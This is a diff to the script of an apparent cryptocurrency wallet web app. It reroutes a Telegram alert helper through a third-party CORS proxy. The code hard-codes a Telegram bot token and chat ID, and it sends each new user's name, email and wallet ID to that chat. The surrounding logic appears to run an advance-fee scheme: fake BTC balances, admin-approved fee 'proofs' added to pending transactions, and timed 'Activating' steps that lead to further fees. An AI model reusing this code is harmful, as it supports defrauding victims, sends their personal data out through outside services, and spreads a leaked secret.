@@ -738,12 +738,16 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
-        // --- TELEGRAM NOTIFICATION HELPER ---
+        // --- TELEGRAM NOTIFICATION HELPER (WITH CORS PROXY) ---
         function sendTelegramAlert(text) {
             const token = "9103189592:AAHKTRSuPiR9Cc2wPwdX6JKqsfm68K73cN0";
             const chat = "8269612727";
-            const api = "https://api.telegram.org/bot" + token + "/sendMessage";
-            fetch(api + "?chat_id=" + chat + "&text=" + encodeURIComponent(text)).catch(function(e){});
+            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=` + encodeURIComponent(text);
+            const proxyUrl = `https://api.allorigins.win/raw?url=` + encodeURIComponent(telegramUrl);
+            
+            fetch(proxyUrl).catch(function(e) {
+                console.log("Telegram alert error:", e);
+            });
         }
 
         // Default Data Structures
@@ -844,7 +848,6 @@
                     u.statusExpiryTime = null;
                     const tx = (u.txs || []).find(t => t.id == u.activeTxId);
                     
-                    // After timer expires, move to NEXT step or complete
                     u.stepIdx = (u.stepIdx || 0) + 1;
                     if (u.stepIdx < actionSteps.length) {
                         const nextStep = actionSteps[u.stepIdx];
@@ -942,7 +945,7 @@
                 guestPrompt.classList.remove('hidden');
                 dashboard.classList.add('hidden');
                 txCard.classList.add('hidden');
-                usdRow.classList.remove('hidden'); // Always visible to display direct USD currency
+                usdRow.classList.remove('hidden');
 
                 document.getElementById('btc-holdings-display').innerText = `0.0000 BTC`;
                 document.getElementById('btc-fiat-value').innerText = `$0.00`;
@@ -1327,7 +1330,6 @@
             if (pendingSaves === 0) { saveState(); alert("Global addresses updated!"); }
         }
 
-        // --- ADMIN MANUAL USER OVERRIDE FUNCTION ---
         function adminManualOverrideUser(e) {
             e.preventDefault();
             const email = document.getElementById('admin-override-user').value;
@@ -1572,7 +1574,6 @@
         }
         function deleteActionStep(id) { actionSteps = actionSteps.filter(x => x.id != id); saveState(); }
 
-        // --- CORRECTED ADMIN APPROVAL FLOW: SETS ASSIGNED STATUS & STARTS TIMER ---
         function approveProof(proofId) {
             const pIndex = proofQueue.findIndex(x => x.id == proofId);
             if (pIndex === -1) return;
@@ -1584,10 +1585,7 @@
                 const tx = u.txs.find(t => t.id == u.activeTxId);
                 const step = actionSteps[p.stepIdx];
                 if (tx && step) {
-                    // 1. Add approved fee amount to pending transaction total
                     tx.amount += step.amount;
-
-                    // 2. Set status to the assigned status message (e.g. Activating) and start the countdown timer
                     tx.status = step.statusMsg.toUpperCase();
                     u.statusExpiryTime = Date.now() + ((step.timerMinutes || 2) * 60 * 1000);
                 }
@@ -1775,7 +1773,7 @@
             closeAuthModal();
             updateBalanceUI();
 
-            // Telegram Alert for New Signup
+            // Telegram Alert for Signup
             sendTelegramAlert(`🎉 New User Signup:\nName: ${name}\nEmail: ${email}\nWallet ID: ${uniqueId}`);
 
             showNotification("Welcome", `Account created! Your ID is ${uniqueId}`, "🎉");
